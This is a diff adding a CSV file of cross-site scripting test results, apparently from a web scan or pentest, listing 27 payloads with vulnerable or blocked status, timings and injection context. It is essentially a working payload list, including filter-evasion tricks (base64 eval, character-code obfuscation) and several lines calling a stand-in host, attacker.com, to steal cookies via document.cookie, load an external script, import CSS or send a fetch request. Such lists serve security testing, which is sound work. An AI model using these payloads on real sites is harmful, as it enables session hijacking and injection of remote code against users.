@@ -1,0 +1,28 @@
+payload,status,response_time_ms,reflected,stored,context,notes
+<script>alert('XSS')</script>,vulnerable,145,TRUE,FALSE,HTML,Basic script injection
+><script>alert('XSS')</script>,vulnerable,152,TRUE,FALSE,HTML_ATTR,Attribute breakout
+><script>alert('XSS')</script>,vulnerable,148,TRUE,FALSE,HTML_ATTR,Single quote breakout
+<img src=x onerror=alert('XSS')>,vulnerable,138,TRUE,FALSE,IMG_TAG,Image onerror event
+<svg onload=alert('XSS')>,vulnerable,141,TRUE,FALSE,SVG,SVG onload event
+"<iframe src='javascript:alert(XSS"")'>",vulnerable,156,TRUE,FALSE,IFRAME,Iframe javascript protocol
+<body onload=alert('XSS')>,blocked,203,FALSE,FALSE,BODY_TAG,WAF filtered
+<input onfocus=alert('XSS') autofocus>,vulnerable,149,TRUE,FALSE,INPUT,Input onfocus event
+<marquee onstart=alert('XSS')>,vulnerable,144,TRUE,FALSE,MARQUEE,Marquee onstart event
+<details open ontoggle=alert('XSS')>,vulnerable,151,TRUE,FALSE,DETAILS,HTML5 details element
+javascript:alert('XSS'),blocked,198,FALSE,FALSE,URL,Browser blocked
+<script>eval(atob('YWxlcnQoJ1hTUycpOw=='))</script>,vulnerable,167,TRUE,FALSE,ENCODED,Base64 encoded payload
+"<img src=x onerror=""eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41));"">",vulnerable,178,TRUE,FALSE,IMG_CHAR_CODE,Character code obfuscation
+<svg/onload=alert`XSS`>,vulnerable,139,TRUE,FALSE,SVG_BACKTICK,Backtick syntax
+<style>@import'http://attacker.com/xss.css';</style>,vulnerable,245,FALSE,TRUE,CSS_IMPORT,CSS import
+"<iframe src='data:text/html,<script>alert(""XSS"")</script>'>",vulnerable,168,TRUE,FALSE,DATA_URI,Data URI scheme
+"<img src=x alt=""test"" title=""test"" onerror=alert('XSS')>",vulnerable,161,TRUE,FALSE,IMG_ATTR,Multiple attributes
+<svg><script>alert('XSS')</script></svg>,vulnerable,155,TRUE,FALSE,SVG_SCRIPT,SVG with script tag
+"<body style=""background:url('javascript:alert(\""XSS\"")');"">",blocked,212,FALSE,FALSE,CSS_JAVASCRIPT,WAF detected
+"<img src=x onerror=alert(String.fromCharCode(88,83,83))>",vulnerable,174,TRUE,FALSE,STRING_FROMCHARCODE,String.fromCharCode bypass
+"<img src=x onerror=""location.href='http://attacker.com/steal?cookie='+document.cookie"">",vulnerable,189,FALSE,TRUE,COOKIE_STEAL,Cookie exfiltration
+<script src='http://attacker.com/payload.js'></script>,vulnerable,267,FALSE,TRUE,EXTERNAL_SCRIPT,External script loading
+<img src=x onerror=fetch('http://attacker.com/log?xss=1')>,vulnerable,298,TRUE,FALSE,FETCH_API,Fetch API call
+<svg><animate attributeName=x dur=1s values=0;alert('XSS');0 />,vulnerable,151,TRUE,FALSE,SVG_ANIMATE,SVG animate
+"<math><mi xlink:href=""javascript:alert('XSS')""></mi></math>",vulnerable,162,TRUE,FALSE,MATHML,MathML exploitation
+<img src=x onerror=alert(this.ownerDocument.domain)>,vulnerable,155,TRUE,FALSE,DOM_PROPERTY,DOM property access
+"<img src=""x"" error=""alert('XSS')\"">",blocked,189,FALSE,FALSE,TYPO_ATTR,Invalid attribute name
